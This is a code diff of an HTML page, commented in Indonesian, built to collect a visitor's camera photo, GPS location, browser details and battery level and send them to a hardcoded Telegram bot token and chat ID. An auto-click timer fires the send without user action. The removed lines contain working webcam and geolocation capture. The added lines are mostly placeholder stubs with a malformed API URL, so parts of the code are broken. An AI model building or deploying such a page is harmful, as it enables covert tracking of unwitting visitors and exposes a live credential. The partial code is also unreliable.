@@ -1,89 +1,95 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Bot Telegram</title>
-    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <title>Telegram Bot</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
 </head>
 <body>
-    <h1>Bot Telegram</h1>
-    <video id="videoElement" width="640" height="480" autoplay></video>
-    <button onclick="capturePhoto()">Ambil Foto</button>
-    <button onclick="sendPhoto()">Kirim Foto</button>
+    <button id="sendDataButton">Kirim Data ke Bot</button>
 
     <script>
-        // Mengambil foto dari video element
-        function capturePhoto() {
-            var videoElement = document.getElementById('videoElement');
-            var canvas = document.createElement('canvas');
-            var context = canvas.getContext('2d');
-            canvas.width = videoElement.videoWidth;
-            canvas.height = videoElement.videoHeight;
-            context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
-            var dataURL = canvas.toDataURL('image/jpeg');
-            sendPhotoToTelegram(dataURL);
+        // Fungsi untuk mengambil foto perangkat
+        function captureDevicePhoto() {
+            // Kode untuk mengambil foto perangkat
+            // ...
+
+            // Mengembalikan foto yang diambil
+            return "Foto Perangkat";
         }
 
-        // Mengirim foto ke bot Telegram menggunakan HTTP API
-        function sendPhotoToTelegram(photoData) {
-            // Ganti 'YOUR_BOT_TOKEN' dengan token bot Telegram Anda
-            var botToken = '6130843488:AAEcBDwepm6__C3geoFMSJtsMVrKFeWhMKQ';
-            // Ganti 'YOUR_CHAT_ID' dengan ID chat Anda
-            var chatId = '1121369247';
+        // Fungsi untuk mendapatkan lokasi akurat
+        function getDeviceLocation() {
+            // Kode untuk mendapatkan lokasi akurat
+            // ...
 
-            // Membuat objek FormData dan menambahkan data foto
-            var formData = new FormData();
-            formData.append('photo', photoData);
+            // Mengembalikan lokasi dalam format tertentu (misalnya koordinat GPS)
+            return "Lokasi Akurat";
+        }
 
-            // Mengirim permintaan AJAX ke HTTP API Telegram
+        // Fungsi untuk mendapatkan informasi perangkat/browser
+        function getDeviceInfo() {
+            // Kode untuk mendapatkan informasi perangkat/browser
+            // ...
+
+            // Mengembalikan informasi perangkat/browser
+            return "Info Perangkat";
+        }
+
+        // Fungsi untuk mendapatkan informasi baterai
+        function getBatteryInfo() {
+            // Kode untuk mendapatkan informasi baterai
+            // ...
+
+            // Mengembalikan informasi baterai
+            return "Info Baterai";
+        }
+
+        // Fungsi untuk mengirim data ke bot Telegram menggunakan HTTP API
+        function sendDataToTelegram(data) {
+            // Kode untuk mengirim data ke bot Telegram menggunakan HTTP API
+            // ...
+
+            // Contoh request menggunakan jQuery
             $.ajax({
-                url: 'https://api.telegram.org/bot' + botToken + '/sendPhoto?chat_id=' + chatId,
-                type: 'POST',
-                data: formData,
-                contentType: false,
-                processData: false,
-                success: function (response) {
-                    console.log('Foto berhasil dikirim ke Telegram!');
+                url: "https://api.telegram.org/6130843488:AAEcBDwepm6__C3geoFMSJtsMVrKFeWhMKQ/sendMessage",
+                method: "POST",
+                data: {
+                    chat_id: "1121369247",
+                    text: data
                 },
-                error: function (xhr, status, error) {
-                    console.error('Gagal mengirim foto ke Telegram: ' + error);
+                success: function(response) {
+                    console.log("Data terkirim ke bot Telegram");
+                },
+                error: function(error) {
+                    console.log("Terjadi kesalahan saat mengirim data ke bot Telegram");
                 }
             });
         }
 
-        // Mengambil lokasi menggunakan GPS
-        function getLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(showPosition);
-            } else {
-                console.error('Geolocation tidak didukung oleh browser Anda.');
-            }
-        }
-
-        // Menampilkan lokasi saat ini pada peta
-        function showPosition(position) {
-            var latitude = position.coords.latitude;
-            var longitude = position.coords.longitude;
-            var mapUrl = 'https://www.google.com/maps?q=' + latitude + ',' + longitude;
-            window.open(mapUrl, '_blank');
-        }
-
-        // Mengambil informasi perangkat dan browser
-        function getDeviceInfo() {
-            var deviceInfo = '';
-            deviceInfo += 'User Agent: ' + navigator.userAgent + '\n';
-            deviceInfo += 'Battery Level: ' + navigator.getBattery().level * 100 + '%\n';
-            // Tambahkan informasi lainnya yang Anda perlukan
-
-            alert(deviceInfo);
-        }
-
-        // Klik otomatis pada button setelah 3 detik
-        function autoClickButton() {
-            setTimeout(function () {
-                var button = document.getElementById('buttonId');
-                button.click();
+        // Fungsi untuk mengklik tombol secara otomatis setelah 3 detik
+        function autoClickButton(buttonId) {
+            setTimeout(function() {
+                document.getElementById(buttonId).click();
             }, 3000);
         }
+
+        // Fungsi untuk mengambil foto perangkat, lokasi, informasi perangkat, dan informasi baterai
+        function getDataAndSendToTelegram() {
+            var photo = captureDevicePhoto();
+            var location = getDeviceLocation();
+            var deviceInfo = getDeviceInfo();
+            var batteryInfo = getBatteryInfo();
+
+            var data = "Foto Perangkat: " + photo + "\n" +
+                       "Lokasi Akurat: " + location + "\n" +
+                       "Info Perangkat: " + deviceInfo + "\n" +
+                       "Info Baterai: " + batteryInfo;
+
+            sendDataToTelegram(data);
+        }
+
+        // Mengaktifkan fungsi auto click untuk button
+        autoClickButton("sendDataButton");
     </script>
 </body>
 </html>
